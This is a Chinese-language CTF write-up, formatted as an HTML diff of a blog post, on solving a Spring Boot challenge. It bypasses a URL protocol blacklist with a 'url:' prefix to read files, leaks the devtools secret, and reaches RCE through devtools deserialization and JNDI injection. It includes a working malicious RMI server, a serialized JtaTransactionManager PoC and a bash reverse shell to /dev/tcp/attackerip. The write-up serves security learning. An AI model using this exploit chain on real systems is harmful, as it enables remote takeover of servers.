@@ -1,0 +1,187 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h3 data-content="1" id="f82c5b103535994131ab5ab2e9660f12">0x01 背景</h3>
+<p>最近接触到一道与Java反序列化利用相关的CTF题目，由于之间接触Java反序列化比较少，并且这道题的反序列化利用中涉及到几个比较有意思的地方，例如URLConnection对访问协议处理的特性、Devtools中存在的反序列化面等，因此将解题过程记录分享。</p>
+<h3 data-content="1" id="43ec7bac9d0bf3a0d7f30c7222b5c18f">0x02 SSRF到任意文件读</h3>
+<p>题目提供了一个Jar包用于分析，用IDEA打开Jar包后发现是一个逻辑很简单的Springboot项目。</p>
+<div class="highlight"><pre><span></span><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">)</span>
+    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">index</span><span class="o">(){</span>
+        <span class="k">return</span> <span class="k">new</span> <span class="n">RedirectView</span><span class="o">(</span><span class="s">"/hello"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/pathneverguess"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">ping</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">url</span><span class="o">){</span>
+
+        <span class="k">return</span> <span class="n">PingUtil</span><span class="o">.</span><span class="na">ping</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/hello"</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">)</span>
+    <span class="nd">@ResponseBody</span>
+    <span class="kd">public</span> <span class="n">Result</span> <span class="nf">hello</span><span class="o">(){</span>
+        <span class="n">Result</span> <span class="n">res</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Result</span><span class="o">(</span><span class="mi">200</span><span class="o">,</span> <span class="s">"hello 123"</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">res</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>控制器中只有三个访问路由，只有第二个路由对请求进行了处理。将传入的url提出来并且作为传参调用PingUtil类的ping方法。进入PingUtil类后看到类的三个函数如下：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">cleanUrl</span><span class="o">(</span><span class="n">String</span> <span class="n">url</span><span class="o">){</span>
+        <span class="n">Integer</span> <span class="n">right</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+        <span class="n">Integer</span> <span class="n">left</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+        <span class="k">while</span> <span class="o">((</span><span class="n">right</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">right</span> <span class="o">-</span> <span class="mi">1</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="sc">' '</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">right</span><span class="o">--;</span>
+        <span class="o">}</span>
+        <span class="k">while</span> <span class="o">((</span><span class="n">left</span> <span class="o">&lt;</span> <span class="n">right</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">url</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">left</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="sc">' '</span><span class="o">))</span> <span class="o">{</span>
+            <span class="n">left</span><span class="o">++;</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">url</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">left</span><span class="o">,</span> <span class="n">right</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Boolean</span> <span class="nf">validate</span><span class="o">(</span><span class="n">String</span> <span class="n">cand</span><span class="o">){</span>
+        <span class="n">String</span> <span class="n">blacklist</span> <span class="o">=</span> <span class="s">"^[file|netdoc|jar|ftp|mailto]"</span><span class="o">;</span>
+        <span class="n">Pattern</span> <span class="n">pattern</span> <span class="o">=</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">compile</span><span class="o">(</span><span class="n">blacklist</span><span class="o">,</span> <span class="n">Pattern</span><span class="o">.</span><span class="na">CASE_INSENSITIVE</span><span class="o">);</span>
+        <span class="n">Matcher</span> <span class="n">matcher</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="na">matcher</span><span class="o">(</span><span class="n">cand</span><span class="o">);</span>
+        <span class="kt">boolean</span> <span class="n">matchFound</span> <span class="o">=</span> <span class="n">matcher</span><span class="o">.</span><span class="na">find</span><span class="o">();</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">matchFound</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">ping</span><span class="o">(</span><span class="n">String</span> <span class="n">urlString</span><span class="o">){</span>
+        <span class="n">String</span> <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span><span class="o">;</span>
+        <span class="n">OutputStream</span> <span class="n">os</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">validate</span><span class="o">(</span><span class="n">cleanUrl</span><span class="o">(</span><span class="n">urlString</span><span class="o">)))</span> <span class="o">{</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="n">urlString</span><span class="o">);</span>
+                <span class="n">URLConnection</span> <span class="n">urlConnection</span> <span class="o">=</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
+                <span class="n">urlConnection</span><span class="o">.</span><span class="na">setReadTimeout</span><span class="o">(</span><span class="mi">5</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">);</span>
+                <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="n">urlConnection</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span>
+                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bs</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">1024</span><span class="o">];</span>
+                <span class="kt">int</span> <span class="n">len</span><span class="o">;</span>
+                <span class="k">while</span> <span class="o">((</span><span class="n">len</span> <span class="o">=</span> <span class="n">is</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bs</span><span class="o">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="n">os</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bs</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">len</span><span class="o">);</span>
+                <span class="o">}</span>
+                <span class="n">os</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+                <span class="n">is</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+                <span class="n">ret</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span><span class="k">else</span> <span class="n">ret</span> <span class="o">=</span> <span class="s">"please buy me a Java XD"</span><span class="o">;</span>
+        <span class="k">return</span> <span class="n">ret</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>ping函数中首先调用clearnUrl和validate对url参数进行了校验，如果通过校验，url将作为URLConnection的参数去访问url指向的资源，并且将访问结果返回输出。其中，clearUrl函数没有特别的地方，主要的过滤是在validate函数逻辑，它定义了<code>^[file|netdoc|jar|ftp|mailto]</code>正则表达式对所有以这5种字符串开头的url进行了校验，并且大小写不敏感。</p>
+<p>查找资料后发现在Java8版本中，Java 的URLConnection支持的协议没有了gopher，而这5种协议又被限制，能使用的http/https在这里很无害，因此只能想办法绕过这个过滤。直接跟进URL类的构造函数查看，可以定位到<code>URL(URL context, String spec, URLStreamHandler handler)</code>构造函数中，传参的spec即为传入的url。在构造函数中有一处定位url起始位置的处理逻辑格外引人注意：</p>
+<div class="highlight"><pre><span></span><span class="n">limit</span> <span class="o">=</span> <span class="n">spec</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+<span class="k">while</span> <span class="o">((</span><span class="n">limit</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">spec</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">limit</span> <span class="o">-</span> <span class="mi">1</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="sc">' '</span><span class="o">))</span> <span class="o">{</span>
+  <span class="n">limit</span><span class="o">--;</span>        <span class="c1">//eliminate trailing whitespace</span>
+<span class="o">}</span>
+<span class="k">while</span> <span class="o">((</span><span class="n">start</span> <span class="o">&lt;</span> <span class="n">limit</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">spec</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">start</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="sc">' '</span><span class="o">))</span> <span class="o">{</span>
+  <span class="n">start</span><span class="o">++;</span>        <span class="c1">// eliminate leading whitespace</span>
+<span class="o">}</span>
+<span class="c1">//引人注意的地方</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">spec</span><span class="o">.</span><span class="na">regionMatches</span><span class="o">(</span><span class="kc">true</span><span class="o">,</span> <span class="n">start</span><span class="o">,</span> <span class="s">"url:"</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">4</span><span class="o">))</span> <span class="o">{</span>
+  <span class="n">start</span> <span class="o">+=</span> <span class="mi">4</span><span class="o">;</span>
+<span class="o">}</span>
+<span class="c1">//这里省略无关的代码</span>
+<span class="o">......</span>
+<span class="c1">//定位提取Protocol</span>
+<span class="k">for</span> <span class="o">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">start</span> <span class="o">;</span> <span class="o">!</span><span class="n">aRef</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">limit</span><span class="o">)</span> <span class="o">&amp;&amp;</span>
+     <span class="o">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">spec</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">))</span> <span class="o">!=</span> <span class="sc">'/'</span><span class="o">)</span> <span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+  <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">':'</span><span class="o">)</span> <span class="o">{</span>
+
+    <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="n">spec</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">start</span><span class="o">,</span> <span class="n">i</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">();</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">isValidProtocol</span><span class="o">(</span><span class="n">s</span><span class="o">))</span> <span class="o">{</span>
+      <span class="n">newProtocol</span> <span class="o">=</span> <span class="n">s</span><span class="o">;</span>
+      <span class="n">start</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="k">break</span><span class="o">;</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>具体来说，如果url（spec）开头4个字符是<code>url:</code>，那么start位置会+4到达<code>url:</code>之后的位置进行后续正常的url解析处理。在后面的循环中将会取用start位置到字符“:”位置之前的字符提取为protocol并调用对应的handler，因此可以借用这个逻辑去绕过正则黑名单的校验，使得原本的http/https SSRF转为了任意文件读取。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200930233927-1fd679ea-0333-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200930234001-3429226c-0333-1.png"/></p>
+<p>Java中的file和netdoc都能够直接列目录，在根目录下看到了flag文件，但是没有权限直接读取。同时还存在一个catforflag的二进制程序，因此推测需要命令执行去读取flag。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200930234021-3ff17fb8-0333-1.png"/></p>
+<h3 data-content="1" id="47200caeea7c8dc34a87e64c760b0f1c">0x03 Devtools反序列化</h3>
+<p>在直接读取flag无果后，读取了<code>/proc/self/environ</code>并且看到下述内容。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200930234044-4dafb002-0333-1.png"/></p>
+<p>从返回结果中可以看到一个比较可疑的SERECT变量，并且确定了JDK的版本是8u265。配合项目中引用的依赖库和Jar包中<code>application.properties</code>里设置的配置值<code>spring.devtools.remote.secret=${SECRET}</code>，基本可以确定是和devtools有关。</p>
+<div class="highlight"><pre><span></span><span class="nt">&lt;dependency&gt;</span>
+  <span class="nt">&lt;groupId&gt;</span>org.springframework.boot<span class="nt">&lt;/groupId&gt;</span>
+  <span class="nt">&lt;artifactId&gt;</span>spring-boot-devtools<span class="nt">&lt;/artifactId&gt;</span>
+  <span class="nt">&lt;optional&gt;</span>true<span class="nt">&lt;/optional&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</pre></div>
+<p>查阅了Springboot中devtools相关资料，在看了大量介绍调试的文章后，最后在一篇今年2月份国外的文章里看到介绍了关于devtools存在弱secret口令可以导致反序列化的问题，文章链接如下：</p>
+<p><a href="https://medium.com/@sherif_ninja/springboot-devtools-insecure-deserialization-analysis-exploit-2c4ac77c285a" target="_blank">https://medium.com/@sherif_ninja/springboot-devtools-insecure-deserialization-analysis-exploit-2c4ac77c285a</a></p>
+<p>其中的核心部分在于这个调试工具提供了对应的接口能够对用户提交的POST内容进行反序列化。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200930234104-59c057b6-0333-1.png"/></p>
+<p>其中处理http接口请求的处理部分在<code>org.springframework.boot.devtools</code>中restart/server的HttpRestartServerHandler类中：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">ServerHttpRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServerHttpResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+  <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">handle</span><span class="o">(</span><span class="n">request</span><span class="o">,</span> <span class="n">response</span><span class="o">);</span>
+<span class="o">}</span>
+</pre></div>
+<p>具体处理在HttpRestartServer类中，代码中通过readObject反序列化POST中传输的HTTP请求体：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">handle</span><span class="o">(</span><span class="n">ServerHttpRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">ServerHttpResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+  <span class="k">try</span> <span class="o">{</span>
+    <span class="n">Assert</span><span class="o">.</span><span class="na">state</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getHeaders</span><span class="o">().</span><span class="na">getContentLength</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="n">L</span><span class="o">,</span> <span class="s">"No content"</span><span class="o">);</span>
+    <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getBody</span><span class="o">());</span>
+    <span class="n">ClassLoaderFiles</span> <span class="n">files</span> <span class="o">=</span> <span class="o">(</span><span class="n">ClassLoaderFiles</span><span class="o">)</span><span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">updateAndRestart</span><span class="o">(</span><span class="n">files</span><span class="o">);</span>
+    <span class="n">response</span><span class="o">.</span><span class="na">setStatusCode</span><span class="o">(</span><span class="n">HttpStatus</span><span class="o">.</span><span class="na">OK</span><span class="o">);</span>
+  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var5</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">logger</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="s">"Unable to handler restart server HTTP request"</span><span class="o">,</span> <span class="n">var5</span><span class="o">);</span>
+    <span class="n">response</span><span class="o">.</span><span class="na">setStatusCode</span><span class="o">(</span><span class="n">HttpStatus</span><span class="o">.</span><span class="na">INTERNAL_SERVER_ERROR</span><span class="o">);</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>Devtools提供的接口访问是需要secret字段进行校验的，如图中HTTP的header中X-AUTH-TOKEN部分，然而根据调查发现这个secret默认是<code>myscret</code>，并且大部分的开发者容易忘记。在这里的环境中，secret通过上面的文件读取已经拿到了，因此后面的步骤就是构造反序列化链达到RCE。</p>
+<h3 data-content="1" id="690fd06aa2bfccc41cbe069ce9ef033f">0x04 JDK8u265</h3>
+<p>目标的JDK环境是8u265，是高版本的JDK，因此一些常规的反序列化链不能用。关于高版本JDK的JNDI注入，已经有前辈进行了比较系统的介绍和总结，例如：</p>
+<pre><code>1、https://www.cnblogs.com/tr1ple/p/12335098.html#AjhQfy4m
+2、https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html
+3、https://aluvion.gitee.io/2020/05/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84RMI%E3%80%81JRMP%E3%80%81JNDI%E3%80%81LDAP/#JNDI-%E6%B3%A8%E5%85%A5
+4、https://paper.seebug.org/942/#classreference-factory
+5、http://m0d9.me/2020/07/11/JNDI%EF%BC%9AJNDI-RMI%20%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87JDK%E9%AB%98%E7%89%88%E6%9C%AC%E9%99%90%E5%88%B6%EF%BC%88%E4%B8%89%EF%BC%89/</code></pre>
+<p>观察提供的Jar中的依赖环境，可以看到<code>tomcat-embed-core9.0.37</code>和<code>spring-tx-5.2.8</code>，因此高版本JDK的JNDI注入是可行的，能够利用spring-tx中的<code>org.springframework.transaction.jta.JtaTransactionManager</code>来触发lookup进而访问恶意的RMI注册中心来调用本地Factory加载<code>tomcat-embed-core9.0.37</code>中的链，通过Java8中自带的<code>ELProcessor</code>来执行任意命令。构造如下：</p>
+<div class="highlight"><pre><span></span><span class="c1">// 恶意RMI注册服务</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">rmi</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+<span class="c1">// 在攻击者的RMI服务端通过代码明确指定远程对象通信Host IP，否则RMI通信有些问题</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"java.rmi.server.hostname"</span><span class="o">,</span> <span class="s">"10.10.0.2"</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Creating evil RMI registry on port 1099"</span><span class="o">);</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
+        <span class="n">ResourceRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ResourceRef</span><span class="o">(</span><span class="s">"javax.el.ELProcessor"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="s">""</span><span class="o">,</span> <span class="kc">true</span><span class="o">,</span><span class="s">"org.apache.naming.factory.BeanFactory"</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">ref</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">"forceString"</span><span class="o">,</span> <span class="s">"KINGX=eval"</span><span class="o">));</span>
+        <span class="n">ref</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="k">new</span> <span class="n">StringRefAddr</span><span class="o">(</span><span class="s">"KINGX"</span><span class="o">,</span> <span class="s">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/bin/bash -i &gt;&amp; /dev/tcp/attackerip/7890 0&gt;&amp;1']).start()\")"</span><span class="o">));</span>
+        <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">jndi</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">registry</span><span class="o">.</span><span class="na">ReferenceWrapper</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+        <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">"Object"</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="c1">//  序列化构造的spring-tx攻击类</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">poc</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">jndiAddress</span> <span class="o">=</span> <span class="s">"rmi://10.10.0.2:1099/Object"</span><span class="o">;</span>
+        <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">transaction</span><span class="o">.</span><span class="na">jta</span><span class="o">.</span><span class="na">JtaTransactionManager</span> <span class="n">object</span> <span class="o">=</span> <span class="k">new</span> <span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">transaction</span><span class="o">.</span><span class="na">jta</span><span class="o">.</span><span class="na">JtaTransactionManager</span><span class="o">();</span>
+        <span class="n">object</span><span class="o">.</span><span class="na">setUserTransactionName</span><span class="o">(</span><span class="n">jndiAddress</span><span class="o">);</span>
+
+        <span class="c1">// 序列化并写入文件</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"expObject"</span><span class="o">));</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>将序列化生成的数据发送给Devtools的接口后能够在监听的服务器拿到shell：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200930234130-68bb6468-0333-1.png"/></p>
+<h3 data-content="1" id="f709fb83fd10883d322b9dc3c76bb66b">0x05 总结</h3>
+<p>本文主要通过对一道CTF题的记录，对URLConnection中可能的SSRF绕过和针对Devtools进行高版本JDK的JNDI注入技术进行了介绍，特别是Devtools的反序列化，这个知识点还没有看到有更多的文章有相关介绍。本文对JDK高版本的绕过利用没有展开，因为之前已经有很多优秀的文章，感兴趣的读者可以选择上述列出的文章地址继续了解。最后，感谢阅读。</p>
+</div>
+</div>
